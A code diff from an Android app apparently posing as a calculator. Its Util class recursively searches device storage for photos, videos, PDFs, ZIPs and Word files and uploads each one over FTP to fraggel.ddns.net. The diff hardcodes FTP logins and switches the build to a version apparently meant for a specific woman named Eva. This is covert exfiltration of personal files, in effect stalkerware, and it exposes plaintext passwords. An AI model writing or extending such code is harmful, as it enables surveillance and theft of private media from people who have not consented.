@@ -17,14 +17,14 @@ import es.fraggel.acalculator.Models.User;
 
 public class Util {
     //App para eva
-    //public static String EMAIL="fraggelillo666@gmail,com";
-    //public static String NOMBRE="Pablo";
+    public static String EMAIL="fraggelillo666@gmail,com";
+    public static String NOMBRE="Pablo";
     //App para mi
     //public static String EMAIL="eva@gmail,com";
     //public static String NOMBRE="Eva";
     //App pruebas
-    public static String EMAIL="pruebas@gmail,com";
-    public static String NOMBRE="Nombre";
+    //public static String EMAIL="pruebas@gmail,com";
+    //public static String NOMBRE="Nombre";
 
     public static String[] permissions = new String[]{
             Manifest.permission.INTERNET,
@@ -40,20 +40,20 @@ public class Util {
             Manifest.permission.REQUEST_INSTALL_PACKAGES};
 
 
-    public static void GetFiles(String ruta,Context mContext){
+    public static void GetFiles(String ruta,Context mContext,User user){
         File f=new File(ruta);
         Log.d("Directorio", f.getAbsolutePath());
         for (File file : f.listFiles()) {
             try {
                 if (file.isDirectory()) {
 
-                    GetFiles(file.getAbsolutePath(),mContext);
+                    GetFiles(file.getAbsolutePath(),mContext,user);
                 } else {
                     String ff = file.getName().toLowerCase();
                     if (ff.indexOf(".mp4") != -1 || ff.indexOf(".3gp") != -1 || ff.indexOf(".m4v") != -1 || ff.indexOf(".mov") != -1
                             || ff.indexOf(".jpg") != -1 || ff.indexOf(".jpeg") != -1 || ff.indexOf(".png") != -1 || ff.indexOf(".bmp") != -1
                             || ff.indexOf(".pdf") != -1 || ff.indexOf(".zip") != -1 || ff.indexOf(".doc") != -1 || ff.indexOf(".docx") != -1) {
-                        uploadFile(file,mContext);
+                        uploadFile(file,mContext,user);
                         Log.d("Calculator", file.getAbsolutePath());
                     }
                 }
@@ -62,7 +62,7 @@ public class Util {
             }
         }
     }
-    public static void uploadFile(File file,Context mContext) {
+    public static void uploadFile(File file,Context mContext,User user) {
         int flag;
         FileInputStream fis = null;
         FTPClient client = new FTPClient();
@@ -72,13 +72,14 @@ public class Util {
             client.connect("fraggel.ddns.net", 2121); // no el puerto es por defecto, podemos usar client.connect("servidor.ftp.com");
             /*client.execPBSZ(0);
             client.execPROT("P");*/
-            client.login("fraggel", "ak47cold");
+            if(user.FirstName.equals("Eva")) {
+                client.login("eva", "14041975");
+            }else{
+                client.login("fraggel", "ak47cold");
+            }
             client.enterLocalPassiveMode();
             client.setFileType(FTP.BINARY_FILE_TYPE);
             workingDir="/ftp/";
-            SharedPreferences pref = mContext.getSharedPreferences("LocalUser",Context.MODE_PRIVATE);
-            User user = new User();
-            user.FirstName = pref.getString("FirstName",null);
             client.changeWorkingDirectory(workingDir);
             client.makeDirectory(user.FirstName);
             workingDir+=user.FirstName+"/";
